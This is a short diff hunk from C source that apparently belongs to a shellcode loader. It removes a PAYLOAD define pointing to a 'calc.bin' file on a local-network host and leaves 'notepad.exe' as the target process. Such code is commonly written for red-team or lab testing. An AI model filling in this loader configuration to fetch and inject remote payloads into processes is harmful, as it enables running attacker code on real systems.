@@ -5,7 +5,7 @@
 #include "Common.h"
 #include "Debug.h"
 
-#define PAYLOAD L"http://192.168.0.13:8000/calc.bin"
+#define PAYLOAD L""
 #define PROC L"notepad.exe"
 
 
